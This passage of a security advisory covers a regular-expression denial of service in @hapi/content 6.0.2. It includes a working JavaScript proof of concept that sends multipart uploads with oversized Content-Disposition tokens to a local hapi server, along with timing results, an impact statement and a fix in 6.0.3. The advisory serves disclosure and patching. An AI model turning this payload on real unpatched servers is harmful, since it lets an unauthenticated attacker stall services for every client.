Workarounds: none that removes the risk, upgrade required. To reduce the delay for each request until you upgrade, set a low payload.maxBytes on routes that accept multipart payloads. A token of 64 KB still blocks the process for more than 1 second.

Proof of concept

Install @hapi/hapi with @hapi/content 6.0.2, then run:

const Hapi = require('@hapi/hapi');
const Net = require('net');

const attack = (port, n) => new Promise((resolve) => {

    const body = `--x\r\nContent-Disposition: form-data; name="f"; ${'a'.repeat(n)}\r\n\r\nv\r\n--x--\r\n`;
    const req = `POST /upload HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary=x\r\nContent-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`;
    const start = process.hrtime.bigint();
    let res = '';
    const socket = Net.connect(port, '127.0.0.1', () => socket.write(req));
    socket.on('data', (chunk) => res += chunk);
    socket.on('close', () => resolve(`${n} byte token  HTTP ${res.split(' ')[1]}  ${(Number(process.hrtime.bigint() - start) / 1e9).toFixed(3)} s`));
});

(async () => {

    const server = Hapi.server({ host: '127.0.0.1', port: 7001 });
    server.route({
        method: 'POST',
        path: '/upload',
        options: {
            auth: false,
            payload: { multipart: { output: 'data' }, parse: true }
        },
        handler: () => ({ ok: true })
    });

    await server.start();
    for (const n of [32000, 64000, 128000]) {
        console.log(await attack(7001, n));
    }

    await server.stop();
})();

With @hapi/content 6.0.2, the time increases by approximately four for each doubling of the token. During each request, the server does not answer other clients:

32000 byte token  HTTP 200  0.424 s
64000 byte token  HTTP 200  1.670 s
128000 byte token  HTTP 200  7.173 s

The reporter measured 542 seconds for a token of 1,024,000 bytes, which is near the default payload.maxBytes.

With @hapi/content 6.0.3:

32000 byte token  HTTP 200  0.011 s
64000 byte token  HTTP 200  0.003 s
128000 byte token  HTTP 200  0.004 s
1024000 byte token  HTTP 200  0.013 s

Impact

This is a denial of service through slow regular expression processing. It affects every hapi server with a route that accepts multipart payloads, and every application that gives untrusted headers to Content.disposition(). An unauthenticated attacker sends one upload request of normal size, and the Node.js process stops answering all clients for seconds to minutes. A small number of these requests keeps the service unavailable.

References

  • https://github.com/hapijs/content/security/advisories/GHSA-8494-f6mr-cjpv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-119202
  • https://github.com/hapijs/content/commit/0993851dc7234976a3fce3a7c31662b213c940fd
  • https://github.com/hapijs/content/releases/tag/v6.0.3
  • https://github.com/advisories/GHSA-8494-f6mr-cjpv
